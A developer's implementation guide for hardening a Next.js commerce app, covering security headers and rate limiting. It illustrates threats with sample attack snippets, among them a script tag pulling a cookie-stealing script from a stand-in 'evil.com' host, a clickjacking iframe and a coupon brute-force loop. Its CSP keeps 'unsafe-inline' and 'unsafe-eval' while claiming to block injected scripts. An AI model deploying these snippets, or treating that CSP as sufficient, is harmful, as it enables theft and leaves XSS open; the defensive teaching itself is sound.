# Security Hardening Sprint - Implementation Guide

**Date:** January 30, 2026  
**Status:** In Progress (Tasks 1-2 Complete)

---

## Overview

This document explains WHY and HOW we implement security hardening. Each task addresses real security threats with practical defenses.

---

## ✅ Task 1: Security Headers (COMPLETE)

### 🎯 The Problem

Your web application is vulnerable to multiple attacks:
- **XSS (Cross-Site Scripting):** Attacker injects malicious JavaScript
- **Clickjacking:** Attacker embeds your site in invisible iframe
- **MIME Sniffing:** Browser executes uploaded "image" as JavaScript
- **Information Leakage:** Sensitive URLs leak to external sites

### 🛡️ The Solution: Security Headers

Security headers are like **locks on your doors** - they tell the browser "don't allow dangerous behavior."

### 📋 What We Implemented

**File:** `commerce-web/next.config.ts`

```typescript
async headers() {
  return [{
    source: '/(.*)',  // Apply to ALL routes
    headers: [
      // 1. Content-Security-Policy
      // 2. X-Frame-Options
      // 3. X-Content-Type-Options
      // 4. Referrer-Policy
      // 5. Permissions-Policy
      // 6. X-DNS-Prefetch-Control
      // 7. Strict-Transport-Security (production only)
    ],
  }];
}
```

### 🔒 Header Breakdown

#### 1. Content-Security-Policy (CSP)
**Threat:** XSS Attack  
**How It Works:** Whitelist of allowed resource sources

**Example Attack (Without CSP):**
```html
<!-- Attacker injects this: -->
<script src="https://evil.com/steal-cookies.js"></script>

<!-- Browser executes it → cookies stolen! -->
```

**Example Defense (With CSP):**
```
Content-Security-Policy: script-src 'self' https://js.stripe.com
<!-- Browser blocks evil.com → attack fails! -->
```

**Our Configuration:**
```typescript
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com"
// ✓ Allow our own scripts
// ✓ Allow Stripe (for payment processing)
// ✗ Block everything else
```

#### 2. X-Frame-Options
**Threat:** Clickjacking  
**How It Works:** Prevents embedding in iframe

**Example Attack (Without Header):**
```html
<!-- Attacker's site (evil.com): -->
<iframe src="yoursite.com/admin" style="opacity:0.01">
</iframe>
<button>Click to win iPhone!</button>

<!-- User clicks button, actually clicks admin panel → data deleted! -->
```

**Example Defense (With Header):**
```
X-Frame-Options: DENY
<!-- Browser refuses to load your site in iframe → attack fails! -->
```

#### 3. X-Content-Type-Options
**Threat:** MIME Sniffing Attack  
**How It Works:** Forces browser to respect Content-Type

**Example Attack (Without Header):**
```javascript
// 1. Attacker uploads "cat.jpg"
// 2. File actually contains: <script>alert('hacked')</script>
// 3. Browser thinks "this looks like HTML" and executes it
// 4. XSS attack succeeds!
```

**Example Defense (With Header):**
```
X-Content-Type-Options: nosniff
// Browser sees Content-Type: image/jpeg
// Browser says "I will ONLY treat this as image"
// Script execution blocked → attack fails!
```

#### 4. Referrer-Policy
**Threat:** Information Leakage  
**How It Works:** Controls Referrer header sent to external sites

**Example Problem (Without Policy):**
```
User visits: yoursite.com/admin/orders?secret=abc123&user=john
User clicks external link: eviltracker.com

Referrer Header Sent:
Referer: yoursite.com/admin/orders?secret=abc123&user=john
← attacker sees full URL with secrets!
```

**Example Fix (With Policy):**
```
Referrer-Policy: strict-origin-when-cross-origin

Referrer Header Sent:
Referer: yoursite.com
← attacker only sees domain, no sensitive params!
```

#### 5. Permissions-Policy
**Threat:** Unauthorized Feature Access  
**How It Works:** Locks down browser APIs

**Example Attack (Without Policy):**
```javascript
// Malicious ad script:
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    // Send webcam feed to attacker!
  });
```

**Example Defense (With Policy):**
```
Permissions-Policy: camera=(), microphone=()
// Browser blocks camera/mic access → attack fails!
```

**Our Configuration:**
```typescript
'camera=()',       // No camera access
'microphone=()',   // No microphone access
'payment=(self)',  // Payment API only for same origin (Stripe)
```

### ✅ Verification

**Test Page:** http://localhost:3001/test/security-headers

**What It Shows:**
- ✅ All headers present in response
- ✅ Visual pass/fail indicators
- ✅ Explanation of each header
- ✅ DevTools verification instructions

**How to Verify:**
1. Visit http://localhost:3001/test/security-headers
2. Press F12 → Network tab
3. Reload page
4. Click request → Headers tab → Response Headers
5. Confirm all headers are present

### 📹 Loom Recording Script

```
1. Open test page
2. Press F12 → Network tab
3. Reload page
4. Show Response Headers section
5. Point out each security header:
   - Content-Security-Policy ✓
   - X-Frame-Options: DENY ✓
   - X-Content-Type-Options: nosniff ✓
   - Referrer-Policy: strict-origin-when-cross-origin ✓
   - Permissions-Policy: camera=(), microphone=() ✓
6. Explain: "These headers protect against XSS, clickjacking, and other attacks"
7. Time: ~2 minutes
```

---

## ✅ Task 2: Rate Limiting (COMPLETE)

### 🎯 The Problem

Attackers can spam your endpoints:
- **Brute Force:** Try 1000s of passwords/coupon codes
- **DoS:** Overwhelm server with requests
- **Webhook Abuse:** Spam webhook endpoints
- **Scraping:** Steal all your data

### 🛡️ The Solution: Rate Limiting

Rate limiting is like a **bouncer at a club** - tracks who enters and blocks troublemakers.

### 📋 What We Implemented

**Files Created:**
- `src/lib/rateLimit.ts` - Core rate limiting logic
- `src/lib/withRateLimit.ts` - Middleware wrapper
- `src/app/test/rate-limit/page.tsx` - Test page

**Files Modified:**
- `src/app/api/coupons/validate/route.ts` - Applied rate limiting

### 🔧 How It Works

```typescript
// 1. Track requests per IP address
const requests = {};

// 2. Check if over limit
if (requests[ip] > 10) {
  return 429; // Too Many Requests
}

// 3. Increment counter
requests[ip]++;

// 4. Allow request
return handler();
```

### 📊 Rate Limit Configuration

```typescript
export const RATE_LIMITS = {
  // Auth: 5 attempts per 15 minutes
  // WHY: Prevents password brute forcing
  AUTH: {
    interval: 15 * 60 * 1000,
    limit: 5,
  },
  
  // Webhooks: 100 requests per minute
  // WHY: Prevents webhook spam
  WEBHOOK: {
    interval: 60 * 1000,
    limit: 100,
  },
  
  // Validation: 10 requests per minute
  // WHY: Prevents coupon code guessing
  VALIDATION: {
    interval: 60 * 1000,
    limit: 10,
  },
};
```

### 💡 Real-World Example: Coupon Brute Force

**Scenario:** Attacker tries to guess valid coupon codes

**Without Rate Limiting:**
```javascript
// Attacker script:
for (let i = 0; i < 1000; i++) {
  fetch('/api/coupons/validate', {
    body: JSON.stringify({ code: `SAVE${i}`, subtotal: 100 })
  });
}
// ← Sends 1000 requests in 10 seconds
// ← Finds valid codes: SAVE10, SAVE20
// ← Steals $1000s in discounts
```

**With Rate Limiting:**
```javascript
// Same attacker script
// Request 1-10: 200 OK ✓
// Request 11: 429 Too Many Requests ❌
// Request 12-1000: 429 Too Many Requests ❌
// ← Attack blocked!
// ← Would take 100 minutes instead of 10 seconds
```

### 🔍 Response Headers

Rate limit info is included in response headers:

```
X-RateLimit-Limit: 10
X-RateLimit-Remaining: 7
X-RateLimit-Reset: 2026-01-30T10:15:00Z
Retry-After: 45
```

**Client can use these to:**
- Show countdown timer
- Disable submit button
- Display "too many requests" message

### ✅ Verification

**Test Page:** http://localhost:3001/test/rate-limit

**What It Does:**
1. Sends 15 rapid requests to `/api/coupons/validate`
2. Shows first 10 requests succeed (200 OK)
3. Shows next 5 requests blocked (429 Too Many Requests)
4. Displays request logs with status codes

**How to Test:**
1. Visit http://localhost:3001/test/rate-limit
2. Click "Send 15 Rapid Requests"
3. Watch logs populate
4. Confirm: 10 green (allowed), 5 red (blocked)

### 📹 Loom Recording Script

```
1. Open test page
2. Click "Send 15 Rapid Requests" button
3. Watch requests in real-time:
   - Requests 1-10: Green (200 OK)
   - Requests 11-15: Red (429 Too Many Requests)
4. Show Results Summary:
   - 10 Allowed Requests
   - 5 Blocked Requests
5. Point out "X-RateLimit-Remaining" column
6. Explain: "First 10 pass, limit kicks in at 11 → rate limiting works!"
7. Time: ~1 minute
```

---

## 🚧 Task 3: Secure Object Storage (IN PROGRESS)

Coming next: Signed URLs for secure file upload/download

---

## 🚧 Task 4: Audit Logs (IN PROGRESS)

Coming next: Track all sensitive actions

---

## 📊 Progress Summary

| Task | Status | Files | Verification |
|------|--------|-------|--------------|
| Security Headers | ✅ Complete | next.config.ts + test page | http://localhost:3001/test/security-headers |
| Rate Limiting | ✅ Complete | rateLimit.ts + test page | http://localhost:3001/test/rate-limit |
| Secure Storage | 🚧 In Progress | - | - |
| Audit Logs | 🚧 In Progress | - | - |

---

## 🎯 Next Steps

1. Complete Task 3: Secure Object Storage with Signed URLs
2. Complete Task 4: Audit Log System
3. Record comprehensive Loom demo
4. Create final documentation

---

**Last Updated:** January 30, 2026  
**Status:** 50% Complete (2/4 tasks done)
